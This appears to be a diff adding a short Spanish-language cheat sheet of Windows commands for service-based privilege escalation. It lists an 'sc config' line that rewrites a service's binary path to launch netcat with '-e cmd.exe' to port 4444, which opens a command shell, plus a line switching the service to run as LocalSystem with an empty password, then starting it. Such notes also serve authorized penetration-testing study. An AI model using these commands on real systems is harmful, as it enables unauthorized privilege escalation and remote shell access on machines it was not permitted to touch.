@@ -1,0 +1,8 @@
+▶ Reconfigurar Servicio (Modificar binpath de un servicio):
+  sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
+▶ Cambiar Configuración de Servicio (Cambiar cuenta de ejecución del servicio):
+  sc config <service> obj= ".\LocalSystem" password= ""
+▶ Iniciar Servicio (Iniciar un servicio):
+  net start <service>
+▶ Listar Servicios (Mostrar servicios en ejecución):
+  sc query
